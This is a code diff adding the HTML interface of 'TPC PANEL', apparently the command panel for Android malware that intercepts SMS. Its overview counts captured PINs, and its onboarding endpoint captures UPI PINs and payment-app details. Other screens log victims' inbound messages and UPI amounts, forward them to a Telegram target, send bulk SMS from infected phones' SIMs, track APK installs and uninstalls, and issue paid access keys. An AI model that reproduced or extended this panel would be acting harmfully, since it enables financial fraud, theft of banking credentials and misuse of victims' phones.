+<svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true"><path d="M6 10h12v8a1 1 0 0 1-1 1h-1v2.2a1.2 1.2 0 0 1-2.4 0V19h-3.2v2.2a1.2 1.2 0 0 1-2.4 0V19H7a1 1 0 0 1-1-1v-8Zm-1.8 0A1.2 1.2 0 0 1 5.4 11.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 4.2 10Zm15.6 0a1.2 1.2 0 0 1 1.2 1.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 19.8 10ZM7.2 8.6C7.5 6.9 8.9 5.6 10.6 5.3l-.6-1.4a.3.3 0 0 1 .5-.3l.7 1.5a5.6 5.6 0 0 1 2.6 0l.7-1.5a.3.3 0 0 1 .5.3l-.6 1.4c1.7.3 3.1 1.6 3.4 3.3H7.2Zm2.3-1.6a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Zm5 0a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Z"/></svg>
+<span>APK</span>
+</a>
+<a href="https://t.me/icivan" target="_blank" rel="noopener">owner ↗</a>
+</div>
+</div>
+</section>
+
+<div class="app" id="app" hidden>
+<header class="topbar">
+<div class="brand">
+<svg class="cat" style="width:34px;height:34px" viewBox="0 0 64 64" aria-hidden="true">
+<defs><linearGradient id="g2" x1="0" y1="0" x2="1" y2="1">
+<stop offset="0%" stop-color="#a855f7"/><stop offset="55%" stop-color="#6366f1"/><stop offset="100%" stop-color="#1e3a8a"/>
+</linearGradient></defs>
+<path d="M13 24 L9 5 L26 15 Z" fill="url(#g2)"/>
+<path d="M51 24 L55 5 L38 15 Z" fill="url(#g2)"/>
+<ellipse cx="32" cy="37" rx="22" ry="19" fill="url(#g2)"/>
+<ellipse cx="24" cy="34" rx="4.6" ry="6" fill="#000"/>
+<ellipse cx="40" cy="34" rx="4.6" ry="6" fill="#000"/>
+<path d="M32 42 l-2.6 3 h5.2 z" fill="#0b1030"/>
+</svg>
+<div><h1>TPC PANEL</h1><p>SMS &amp; UPI Control</p></div>
+</div>
+
+<div class="top-right">
+<span class="pill"><span class="dot"></span><span id="linkLabel">Checking</span></span>
+<span class="badge" id="roleBadge">—</span>
+<a class="apk" id="apkBtn" href="#" target="_blank" rel="noopener" title="Download APK">
+<svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor" aria-hidden="true"><path d="M6 10h12v8a1 1 0 0 1-1 1h-1v2.2a1.2 1.2 0 0 1-2.4 0V19h-3.2v2.2a1.2 1.2 0 0 1-2.4 0V19H7a1 1 0 0 1-1-1v-8Zm-1.8 0A1.2 1.2 0 0 1 5.4 11.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 4.2 10Zm15.6 0a1.2 1.2 0 0 1 1.2 1.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 19.8 10ZM7.2 8.6C7.5 6.9 8.9 5.6 10.6 5.3l-.6-1.4a.3.3 0 0 1 .5-.3l.7 1.5a5.6 5.6 0 0 1 2.6 0l.7-1.5a.3.3 0 0 1 .5.3l-.6 1.4c1.7.3 3.1 1.6 3.4 3.3H7.2Zm2.3-1.6a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Zm5 0a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Z"/></svg>
+<span>APK</span>
+</a>
+<a class="tg" href="https://t.me/icivan" target="_blank" rel="noopener" title="Contact owner">
+<svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+<path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/>
+</svg>
+</a>
+<button class="btn danger" id="logoutBtn" type="button">Logout</button>
+</div>
+</header>
+
+<div class="layout">
+<aside class="side">
+<div>
+<p class="side-label">Main</p>
+<button class="nav on" data-page="overview" type="button"><i>▦</i> Overview</button>
+<button class="nav" data-page="live" type="button"><i>⚡</i> Live dashboard</button>
+<button class="nav" data-page="messages" type="button"><i>✉</i> Messages</button>
+<p class="side-label" style="margin-top:22px">Automation</p>
+<button class="nav" data-page="relay" type="button"><i>📡</i> Relay</button>
+<p class="side-label" style="margin-top:22px">Growth</p>
+<button class="nav" data-page="growth" data-admin-only="1" type="button"><i>📈</i> Installs</button>
+<p class="side-label" style="margin-top:22px">System</p>
+<button class="nav" data-page="devices" type="button"><i>▣</i> Devices</button>
+<button class="nav" data-page="users" data-admin-only="1" type="button"><i>🔑</i> Access keys</button>
+<button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
+</div>
+<div class="side-foot">
+<div>TPC PANEL · v5.4</div>
+<div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
+</div>
+</aside>
+
+<main>
+<div class="notice" id="notice" hidden></div>
+
+<section class="page on" id="page-overview">
+<div class="head">
+<div><h2>Overview</h2><p>Fleet health at a glance</p></div>
+<button class="btn ghost" id="refreshBtn" type="button">↻ Refresh</button>
+</div>
+<div class="stats">
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Total devices</span><span class="stat-icon">▣</span></div>
+<div class="stat-val neon" id="sTotal">—</div><div class="stat-foot">registered</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Online</span><span class="stat-icon">◉</span></div>
+<div class="stat-val green" id="sOnline">—</div><div class="stat-foot">socket up</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Offline</span><span class="stat-icon">○</span></div>
+<div class="stat-val red" id="sOffline">—</div><div class="stat-foot">socket down</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Total SIMs</span><span class="stat-icon">▤</span></div>
+<div class="stat-val violet" id="sSims">—</div><div class="stat-foot">slots reported</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">PINs captured</span><span class="stat-icon">🔑</span></div>
+<div class="stat-val violet" id="sPins">—</div><div class="stat-foot">onboarded devices</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Installs</span><span class="stat-icon">⬇</span></div>
+<div class="stat-val neon" id="sInstalls">—</div><div class="stat-foot">APK installs lifetime</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Uninstalled</span><span class="stat-icon">✕</span></div>
+<div class="stat-val red" id="sUninstalled">—</div><div class="stat-foot">no ping &gt; 7 days</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Reinstalls</span><span class="stat-icon">↻</span></div>
+<div class="stat-val violet" id="sReinstalls">—</div><div class="stat-foot">same phone, dobara</div>
+</article>
+</div>
+
+<div class="grid2">
+<section class="panel-box panel">
+<div class="panel-head"><h3>Recent devices</h3>
+<button class="btn ghost" data-goto="devices" type="button">View all</button></div>
+<div class="table-wrap">
+<table><thead><tr><th>Device</th><th>ID</th><th>Number</th><th>Status</th><th>Registered</th></tr></thead>
+<tbody id="recentBody"></tbody></table>
+</div>
+</section>
+<section class="panel-box panel">
+<div class="panel-head"><h3>System status</h3></div>
+<div class="panel-body">
+<div class="row"><div><div class="row-name">Backend API</div><div class="row-desc">/health</div></div><span class="badge" id="apiBadge">Checking</span></div>
+<div class="row"><div><div class="row-name">MongoDB</div><div class="row-desc">/health/database</div></div><span class="badge" id="dbBadge">Checking</span></div>
+<div class="row"><div><div class="row-name">Admin socket</div><div class="row-desc">live link</div></div><span class="badge" id="wsBadge">Connecting</span></div>
+<div class="row"><div><div class="row-name">Relay</div><div class="row-desc">MTProto channel watcher</div></div><span class="badge" id="relayBadge">—</span></div>
+</div>
+</section>
+</div>
+</section>
+
+<section class="page" id="page-live">
+<div class="head">
+<div><h2>Live dashboard</h2><p>Real-time fleet and bulk sending</p></div>
+<button class="btn ghost" data-refresh="live" type="button">↻ Refresh</button>
+</div>
+<div class="stats">
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Total</span><span class="stat-icon">▣</span></div>
+<div class="stat-val neon" id="lTotal">—</div><div class="stat-foot">devices</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Online</span><span class="stat-icon">◉</span></div>
+<div class="stat-val green" id="lOnline">—</div><div class="stat-foot">socket up</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Offline</span><span class="stat-icon">○</span></div>
+<div class="stat-val red" id="lOffline">—</div><div class="stat-foot">socket down</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">UPI</span><span class="stat-icon">₹</span></div>
+<div class="stat-val violet" id="lUpi">—</div><div class="stat-foot">tagged messages</div>
+</article>
+</div>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Bulk send</h3><span class="badge" id="bulkBadge">all devices</span></div>
+<div class="bulk">
+<div>
+<label for="bulkBody">Message</label>
+<textarea id="bulkBody" placeholder="Type message to broadcast…"></textarea>
+</div>
+<div>
+<label for="bulkTarget">Target</label>
+<select id="bulkTarget">
+<option value="all">All devices</option>
+<option value="online">Online only</option>
+</select>
+<label style="margin-top:12px">SIM se bhejo</label>
+<div class="simchips" id="bulkSims"></div>
+<label for="bulkTo" style="margin-top:12px">Send to number (optional)</label>
+<input id="bulkTo" placeholder="blank = device SIM number">
+</div>
+<div class="bulk-actions">
+<button class="btn primary" id="bulkSend" type="button">⚡ Broadcast</button>
+<button class="btn plain" id="bulkClear" type="button">Clear</button>
+</div>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Devices</h3><span class="badge" id="liveCount">0</span></div>
+<div class="table-wrap">
+<table><thead><tr><th>Device</th><th>Target number</th><th>SIM</th><th>Send message</th><th></th></tr></thead>
+<tbody id="liveBody"></tbody></table>
+</div>
+</section>
+</section>
+
+<section class="page" id="page-messages">
+<div class="head">
+<div><h2>Messages</h2><p>All inbound and outbound SMS</p></div>
+<div class="toolbar">
+<input id="msgSearch" placeholder="🔍 search body / number / TPC-id…">
+<select id="msgFilter" style="width:auto">
+<option value="">All</option>
+<option value="in">Inbound</option>
+<option value="out">Outbound</option>
+<option value="upi">UPI only</option>
+</select>
+<button class="btn ghost" data-refresh="messages" type="button">↻ Refresh</button>
+</div>
+</div>
+<section class="panel-box panel">
+<div class="panel-head"><h3>Message log</h3><span class="badge" id="msgCount">0</span></div>
+<div class="table-wrap">
+<table><thead><tr><th>Time</th><th>Device</th><th>Dir</th><th>SIM</th><th>From / To</th><th>Body</th><th>Amount</th><th>Status</th></tr></thead>
+<tbody id="msgBody"></tbody></table>
+</div>
+</section>
+</section>
+
+<section class="page" id="page-relay">
+<div class="head">
+<div><h2>Relay</h2><p>Telegram channel → device SMS · device SMS → forward target (banned filtered)</p></div>
+<button class="btn ghost" data-refresh="relay" type="button">↻ Refresh</button>
+</div>
+<div class="grid2">
+<section class="panel-box panel">
+<div class="panel-head"><h3>MTProto login</h3><span class="badge" id="relayState">—</span></div>
+<div class="panel-body">
+<div id="relayLoggedOut">
+<div class="field-row">
+<div><label for="relayApiId">API ID</label><input id="relayApiId" class="mono" placeholder="36161026"></div>
+<div><label for="relayApiHash">API Hash</label><input id="relayApiHash" class="mono" placeholder="ac1ee01…"></div>
+</div>
+<label for="relayPhone">Phone (country code ke saath)</label>
+<input id="relayPhone" class="mono" placeholder="+91…">
+<div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap">
+<button class="btn primary" id="relayStart" type="button">Send code</button>
+<button class="btn plain" id="relayLogout" type="button">Logout</button>
+</div>
+<div id="relayCodeBox" hidden style="margin-top:16px">
+<label for="relayCode">Login code</label>
+<input id="relayCode" class="mono" placeholder="12345">
+<label for="relayPass" style="margin-top:10px">2FA password (agar ho)</label>
+<input id="relayPass" type="password" placeholder="••••••">
+<button class="btn primary" id="relayVerify" style="margin-top:12px" type="button">Verify &amp; connect</button>
+</div>
+</div>
+<div id="relayLoggedIn" hidden>
+<div class="row"><div><div class="row-name">Account</div><div class="row-desc" id="relayMe">—</div></div><span class="badge ok">authorized</span></div>
+<div class="row"><div><div class="row-name">Watching channels</div><div class="row-desc" id="relayChan">—</div></div><span class="badge" id="relayChanBadge">—</span></div>
+<div class="row"><div><div class="row-name">Forward device SMS to</div><div class="row-desc" id="relayFwd">—</div></div><span class="badge" id="relayFwdBadge">—</span></div>
+<label for="fwdInput" style="margin-top:14px">Forward target</label>
+<div class="inline" style="margin-bottom:6px">
+<input id="fwdInput" class="mono" placeholder="@yourid">
+<button class="btn ghost" id="fwdSave" type="button">Save</button>
+</div>
+<div class="row"><div><div class="row-name">Last error</div><div class="row-desc" id="relayErr">—</div></div></div>
+<div class="row"><div><div class="row-name">Test connection</div><div class="row-desc">forward target par test message bhejo</div></div>
+<button class="btn ghost" id="relayTest" type="button">Send test</button></div>
+</div>
+</div>
+</section>
+<section class="panel-box panel">
+<div class="panel-head"><h3>Ban list</h3><span class="badge" id="banCount">0</span></div>
+<div class="panel-body">
+<div style="display:flex;gap:10px;flex-wrap:wrap">
+<input id="banInput" class="mono" placeholder="+91… ya sender id" style="flex:1 1 200px">
+<button class="btn primary" id="banAdd" type="button">Ban</button>
+</div>
+<div id="banList" style="margin-top:14px"></div>
+</div>
+</section>
+</div>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Parser test</h3><span class="badge">channel format</span></div>
+<div class="panel-body">
+<label for="parseText">Channel ka message paste karo</label>
+<textarea id="parseText" class="mono" placeholder="📱 SMS Intercepted&#10;━━━━━━━━━━━━━━&#10;📞 To: +91…&#10;💬 Message: …"></textarea>
+<button class="btn ghost" id="parseBtn" style="margin-top:12px" type="button">Parse</button>
+<pre id="parseOut" class="pre-out">—</pre>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Relay log</h3><span class="badge" id="tgCount">0</span></div>
+<div class="table-wrap">
+<table><thead><tr><th>Time</th><th>Direction</th><th>Text</th><th>Result</th></tr></thead>
+<tbody id="tgBody"></tbody></table>
+</div>
+</section>
+
+<div class="divider">Auto-reply rules</div>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>New rule</h3></div>
+<div class="panel-body">
+<div class="field-row">
+<div><label for="ruleName">Rule name</label><input id="ruleName" placeholder="e.g. UPI thanks"></div>
+<div><label for="ruleMatch">Match text (contains)</label><input id="ruleMatch" placeholder="e.g. UPI"></div>
+</div>
+<label for="ruleReply">Auto reply</label>
+<textarea id="ruleReply" placeholder="Thanks! Payment received."></textarea>
+<p class="small muted" style="margin:6px 0 0">Placeholders: <code class="mono">{amount}</code> <code class="mono">{sender}</code> <code class="mono">{device}</code> <code class="mono">{time}</code></p>
+<div style="display:flex;gap:10px;margin-top:14px;align-items:center;flex-wrap:wrap">
+<button class="btn primary" id="ruleAdd" type="button">Add rule</button>
+<label class="badge" style="gap:7px;cursor:pointer;margin:0;text-transform:none;letter-spacing:.4px">
+<input type="checkbox" id="ruleUpi" style="width:auto"> UPI only
+</label>
+</div>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Active rules</h3><span class="badge" id="ruleCount">0</span></div>
+<div class="table-wrap">
+<table><thead><tr><th>Name</th><th>Match</th><th>Reply</th><th>Scope</th><th>Status</th><th></th></tr></thead>
+<tbody id="ruleBody"></tbody></table>
+</div>
+</section>
+</section>
+
+<section class="page" id="page-growth">
+<div class="head">
+<div><h2>Installs</h2><p>APK kitni baar install hui, kitni devices chhod gayi</p></div>
+<div class="toolbar">
+<select id="growthFilter" style="width:auto">
+<option value="">All events</option>
+<option value="install">Install</option>
+<option value="update">Update</option>
+<option value="open">Open</option>
+<option value="gone">Gone</option>
+</select>
+<button class="btn ghost" data-refresh="growth" type="button">↻ Refresh</button>
+</div>
+</div>
+
+<div class="stats">
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Installs</span><span class="stat-icon">⬇</span></div>
+<div class="stat-val neon" id="gInstalls">—</div><div class="stat-foot">lifetime</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Live now</span><span class="stat-icon">◉</span></div>
+<div class="stat-val green" id="gLive">—</div><div class="stat-foot">active in 90s</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Idle &lt;24h</span><span class="stat-icon">○</span></div>
+<div class="stat-val violet" id="gIdle">—</div><div class="stat-foot">reachable</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Stale 1-7d</span><span class="stat-icon">⌛</span></div>
+<div class="stat-val" id="gStale">—</div><div class="stat-foot">slow fade</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Uninstalled</span><span class="stat-icon">✕</span></div>
+<div class="stat-val red" id="gUninstalled">—</div><div class="stat-foot">&gt; 7 days silent</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Reinstalls</span><span class="stat-icon">↻</span></div>
+<div class="stat-val violet" id="gReinstalls">—</div><div class="stat-foot">churn signal</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Unique phones</span><span class="stat-icon">▣</span></div>
+<div class="stat-val" id="gUnique">—</div><div class="stat-foot">distinct android_id</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Installs 24h</span><span class="stat-icon">＋</span></div>
+<div class="stat-val green" id="gToday">—</div><div class="stat-foot">aaj</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Uninstall rate</span><span class="stat-icon">%</span></div>
+<div class="stat-val red" id="gRate">—</div><div class="stat-foot">uninstalled / installs</div>
+</article>
+</div>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Send queue</h3><span class="badge" id="gQueueBadge">—</span></div>
+<div class="panel-body">
+<div class="row"><div><div class="row-name">Queued</div><div class="row-desc">device tak pahuncha, radio pending</div></div><span class="badge warn" id="gQueued">0</span></div>
+<div class="row"><div><div class="row-name">Sent</div><div class="row-desc">radio ne accept kiya</div></div><span class="badge ok" id="gSent">0</span></div>
+<div class="row"><div><div class="row-name">Delivered</div><div class="row-desc">carrier delivery report aaya</div></div><span class="badge ok" id="gDelivered">0</span></div>
+<div class="row"><div><div class="row-name">Failed</div><div class="row-desc">send error</div></div><span class="badge bad" id="gFailed">0</span></div>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Event feed</h3><span class="badge" id="gEventCount">0</span></div>
+<div class="table-wrap">
+<table><thead><tr><th>Time</th><th>Event</th><th>Device</th><th>ID</th><th>Version</th><th>Android ID</th></tr></thead>
+<tbody id="gEventBody"></tbody></table>
+</div>
+</section>
+</section>
+
+<section class="page" id="page-devices">
+<div class="head">
+<div><h2>Devices</h2><p>Kisi bhi phone par click karo — Actions me Auto Sender on/off karo</p></div>
+<div class="toolbar">
+<input id="devSearch" placeholder="🔍 TPC-0001 / device / model / number">
+<button class="btn ghost" id="pinsBtn" type="button">🔑 PINs only</button>
+<button class="btn ghost" data-refresh="devices" type="button">↻ Refresh</button>
+</div>
+</div>
+<div class="dev-grid" id="devGrid"></div>
+<div class="empty" id="devEmpty" hidden>No devices registered</div>
+</section>
+
+<section class="page" id="page-users">
+<div class="head">
+<div><h2>Access keys</h2><p>Key generate karo, user ko do — koi register nahi</p></div>
+<div class="toolbar">
+<input id="userSearch" placeholder="🔍 key / label / phone">
+<button class="btn ghost" data-refresh="users" type="button">↻ Refresh</button>
+</div>
+</div>
+
+<div class="stats">
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Total keys</span><span class="stat-icon">🔑</span></div>
+<div class="stat-val neon" id="uTotal">—</div><div class="stat-foot">generated</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Active</span><span class="stat-icon">◉</span></div>
+<div class="stat-val green" id="uActive">—</div><div class="stat-foot">valid access</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Expired</span><span class="stat-icon">⌛</span></div>
+<div class="stat-val red" id="uExpired">—</div><div class="stat-foot">renew needed</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Blocked</span><span class="stat-icon">⛔</span></div>
+<div class="stat-val violet" id="uBlocked">—</div><div class="stat-foot">manually blocked</div>
+</article>
+</div>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Generate new key</h3><span class="badge">admin only</span></div>
+<div class="keygen">
+<div>
+<label for="kLabel">Label / user name</label>
+<input id="kLabel" placeholder="e.g. Rahul">
+</div>
+<div>
+<label for="kPhone">Phone (optional)</label>
+<input id="kPhone" class="mono" placeholder="+91…">
+</div>
+<div>
+<label for="kDays">Expiry</label>
+<select id="kDays">
+<option value="7">7 days</option>
+<option value="30" selected>30 days</option>
+<option value="90">90 days</option>
+<option value="365">1 year</option>
+<option value="0">Lifetime</option>
+</select>
+</div>
+<div><button class="btn primary w100" id="kGen" type="button">🔑 Generate key</button></div>
+</div>
+<div class="panel-body" style="padding-top:0">
+<div class="keyout" id="kOut" hidden>
+<div>
+<div class="small muted upper">Ye key user ko bhejo</div>
+<div class="k" id="kValue">—</div>
+</div>
+<button class="mini g" id="kCopy" type="button">⧉ copy key</button>
+</div>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Keys</h3><span class="badge" id="userCount">0</span></div>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Key</th><th>Label</th><th>Created</th><th>Last login</th><th>Logins</th><th>Expiry</th><th>Status</th><th>Set expiry</th><th></th></tr></thead>
+<tbody id="userBody"></tbody>
+</table>
+</div>
+</section>
+</section>
+
+<section class="page" id="page-settings">
+<div class="head"><div><h2>Settings</h2><p>Endpoints and operator notes</p></div></div>
+<section class="panel-box panel">
+<div class="panel-head"><h3>Application</h3></div>
+<div class="panel-body">
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v5.4</p></div>
+<div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
+<div class="settings-row"><strong>APK</strong><p><a id="apkSettings" href="#" target="_blank" rel="noopener">—</a></p></div>
+<div class="settings-row"><strong>Access</strong><p>Admin: username + password. User: sirf access key (admin generate karta hai, koi self-register nahi).</p></div>
+<div class="settings-row"><strong>Key endpoints</strong><p>POST /admin/keys (generate) · POST /panel/access (login by key) · POST /admin/keys/{id}/expiry|toggle|delete</p></div>
+<div class="settings-row"><strong>Dual SIM</strong><p>Auto Sender me SIM 1 / SIM 2 chips se choose karo — jo on honge wahi slots par SMS queue hoga. Message list me SIM badge dikhta hai. Ack me sim_slot wapas aata hai, isliye badge exact hota hai.</p></div>
+<div class="settings-row"><strong>Telegram confirm</strong><p>On hone par har auto-send ka confirm forward target par set format me jaata hai.</p></div>
+<div class="settings-row"><strong>Send</strong><p>/admin/send — target, device_id, to, body, sim_slots[] . Delivery fail ho to row pending rehti hai aur device online hote hi chali jaati hai.</p></div>
+<div class="settings-row"><strong>Send status</strong><p>queued → sent → delivered. Device har stage par ack bhejta hai; stale "queued" rows 3 min baad dobara push hoti hain.</p></div>
+<div class="settings-row"><strong>Growth</strong><p>/devices/event par install / update / open. Uninstall Android se broadcast nahi hota — 7 din silence = uninstalled. Same android_id par naya install_id = reinstall.</p></div>
+<div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
+<div class="settings-row"><strong>SMS ingest</strong><p>/devices/sms/incoming</p></div>
+<div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding — phone number, payment app aur UPI PIN capture</p></div>
+<div class="settings-row"><strong>Relay</strong><p>/admin/relay/* — MTProto login, bans, parser test, forward target.</p></div>
+<div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET (Heroku par set karna zaruri hai), ADMIN_API_KEY, MONGODB_URI aur TELE_API_HASH server-side rakho.</p></div>
+</div>
+</section>
+</section>
+
+<div class="foot">TPC PANEL · authorized operator access</div>
+</main>
+</div>
+</div>
+
+<div class="overlay" id="detail" hidden>
+<div class="shell">
+<div class="detail-head panel">
+<div class="detail-id">
+<div class="phone" id="dIcon"></div>
+<div style="min-width:0">
+<div class="detail-name" id="dName">Device</div>
+<div class="detail-sub" id="dSub">—</div>
+<div class="detail-tags" id="dTags"></div>
+</div>
+</div>
+<div class="detail-actions">
+<span id="dBatt"></span>
+<div class="act-wrap">
+<button class="btn ghost" id="actBtn" type="button">⚡ Actions ▾</button>
+<div class="act-menu" id="actMenu" hidden>
+<button data-act="auto" type="button">🤖 Auto Sender</button>
+<button data-act="fetch" type="button">⟳ fetch number</button>
+<button data-act="ping" type="button">📶 ping</button>
+<button data-act="push" type="button">📤 push pending outbox</button>
+<button data-act="copy" type="button">⧉ copy device ID</button>
+</div>
+</div>
+<button class="btn plain" id="dClose" type="button">Close</button>
+</div>
+</div>
+
+<div class="banner" id="dBanner" hidden></div>
+
+<section class="panel-box panel as-panel" id="asPanel" hidden>
+<div class="as-head">
+<div class="as-ico">🤖</div>
+<div style="flex:1;min-width:0">
+<div class="as-title">Auto Sender <span class="badge" id="asBadge">—</span></div>
+<div class="as-sub">Telegram channel padho aur SMS auto-send karo</div>
+</div>
+<button class="switch" id="asToggle" type="button" title="Enable / disable"></button>
+<button class="btn plain" id="asCollapse" type="button">▾</button>
+</div>
+<div class="as-body" id="asBody">
+<div class="step">
+<span class="step-tag">STEP 1</span>
+<p class="step-desc">Is Telegram account ko apne channel me admin banao</p>
+<div class="copy-row">
+<span class="mono" id="asAccount">—</span>
+<button class="mini" id="asCopy" type="button">copy</button>
+</div>
+</div>
+<div class="step">
+<span class="step-tag">STEP 2 — BIND CHANNEL</span>
+<label for="chanInput" style="margin-top:12px">Channel ID</label>
+<div class="inline">
+<input id="chanInput" class="mono" placeholder="-1001234567890">
+<button class="btn plain" id="chanVerify" type="button">Verify</button>
+</div>
+<div class="ok-msg" id="chanMsg" hidden><span id="chanMsgTxt"></span></div>
+<p class="hint">Channel → Manage → Channel Info → ID (ya @userinfobot se lo).</p>
+<button class="btn primary w100" id="chanBind" type="button">✓ Channel Bound — Update</button>
+<div class="status-panel off" id="listenPanel">Listening on <span class="mono" id="listenId">—</span></div>
+</div>
+<div class="step">
+<span class="step-tag">STEP 3 — KIS SIM SE BHEJNA HAI</span>
+<p class="step-desc">Jitne SIM on karoge, utne se SMS jaayega. Dono on = SIM 1 + SIM 2 se.</p>
+<div class="simchips" id="asSims"></div>
+<div class="toggle-row" style="margin-top:12px">
+<div><div class="t-name">Telegram confirm</div>
+<div class="t-desc">Bheje gaye SMS ka confirm set format me forward target par</div></div>
+<button class="switch" id="asTgConfirm" type="button"></button>
+</div>
+<button class="btn ghost w100" id="testConn" style="margin-top:12px" type="button">Test connection</button>
+</div>
+</div>
+</section>
+
+<div class="detail-grid">
+<div class="col">
+<section class="panel-box panel">
+<div class="panel-head"><h3>Numbers</h3><span class="badge" id="dNumState">—</span></div>
+<div class="panel-body" id="dNumbers"></div>
+</section>
+<section class="panel-box panel">
+<div class="panel-head"><h3>Specs</h3></div>
+<div class="panel-body"><div class="spec-grid" id="dSpecs"></div></div>
+</section>
+<section class="panel-box panel">
+<div class="panel-head"><h3>Send SMS</h3><span class="badge" id="dTarget">—</span></div>
+<div class="panel-body">
+<label for="dTo">To (blank = device SIM number)</label>
+<input id="dTo" placeholder="+91…" class="mono">
+<label style="margin-top:12px">SIM se bhejo</label>
+<div class="simchips" id="dSims"></div>
+<label for="dBody">Message</label>
+<textarea id="dBody" placeholder="Type message…"></textarea>
+<button class="btn primary" id="dSend" style="margin-top:12px" type="button">⚡ Send</button>
+<div class="muted small upper" style="margin:16px 0 6px">Recent sends</div>
+<div id="dOutbox"></div>
+</div>
+</section>
+<section class="panel-box panel">
+<div class="panel-head"><h3>More info</h3><button class="btn ghost" id="dMoreToggle" type="button">show</button></div>
+<div class="panel-body" id="dMore" hidden></div>
+</section>
+</div>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Messages</h3><span class="badge" id="dMsgCount">0</span></div>
+<div class="searchbar">
+<input id="dSearch" placeholder="🔍 search message / number / amount…">
+<select id="dDir">
+<option value="">All</option><option value="in">Inbound</option><option value="out">Outbound</option>
+</select>
+<label class="badge lbl"><input type="checkbox" id="dUpi"> UPI only</label>
+</div>
+<div class="msg-list" id="dMsgList"></div>
+</section>
+</div>
+</div>
+</div>
+
+<div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+
+<script>
+"use strict";
+
+const $ = (s) => document.querySelector(s);
+const PHONE_SVG = '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"><rect x="6" y="2.4" width="12" height="19.2" rx="3.2"/><line x1="10.4" y1="5.4" x2="13.6" y2="5.4"/><circle cx="12" cy="18.3" r="0.95" fill="currentColor" stroke="none"/></svg>';
+const BOLT_SVG = '<svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M13.5 2 5 13h5.5L9.5 22 19 10.5h-5.9z"/></svg>';
+const SIM_SVG = '<svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M7.5 3h6.8L19 7.7V20a1 1 0 0 1-1 1H7.5a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1z"/><rect x="9.4" y="12.4" width="6.2" height="5.2" rx="1.1"/><path d="M9.4 9.4h3.4"/></svg>';
+
+const APK_URL = "https://github.com/usual-coderz/screenlink-remote/actions/runs/39284106720#artifacts";
+
+const TKEY = "tpc.token.v9";
